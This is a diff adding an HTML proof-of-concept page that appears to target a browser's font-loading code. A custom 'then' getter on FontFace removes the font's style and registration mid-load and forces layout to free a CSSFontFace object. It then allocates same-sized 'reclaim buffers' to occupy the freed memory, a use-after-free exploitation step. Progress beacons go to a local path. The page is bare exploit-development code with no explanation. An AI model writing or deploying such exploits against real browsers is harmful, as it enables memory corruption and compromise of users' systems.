@@ -1,0 +1,66 @@
+<!-- p569d: isolate which part of the .then getter causes OOM -->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p569d then isolation</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+var styleEl = null, firedHere = false;
+
+function start() {
+  b('P569D-START');
+
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+
+  b('P569D-SETUP-OK');
+
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (firedHere) return undefined;
+      firedHere = true;
+      b('P569D-GETTER-FIRED');
+
+      // Step A: remove style
+      if (styleEl) { styleEl.remove(); styleEl.textContent = ''; }
+      b('P569D-STYLE-REMOVED');
+
+      // Step B: delete from fonts
+      try { document.fonts.delete(this); } catch(e) {}
+      styleEl = null;
+      b('P569D-FONTS-DELETED');
+
+      // Step C: force layout (this triggers CSSFontFace free)
+      document.body.offsetHeight;
+      b('P569D-LAYOUT-FORCED');
+
+      // Step D: allocate reclaim buffers (K=2, minimal)
+      var buf1 = new Uint8Array(new ArrayBuffer(192));
+      var buf2 = new Uint8Array(new ArrayBuffer(192));
+      window.__bufs = [buf1, buf2];
+      b('P569D-ALLOC-OK');
+
+      return undefined;
+    },
+    set: function() {}
+  });
+
+  b('P569D-GETTER-INSTALLED');
+
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function() { b('P569D-RESOLVED'); },
+    function() { b('P569D-REJECTED'); }
+  );
+
+  b('P569D-LOAD-CALLED');
+  setTimeout(function(){ b('P569D-DONE'); }, 1000);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(start, 0);
+else document.addEventListener('DOMContentLoaded', start);
+</script></head><body><p>p569d then isolation</p></body></html>
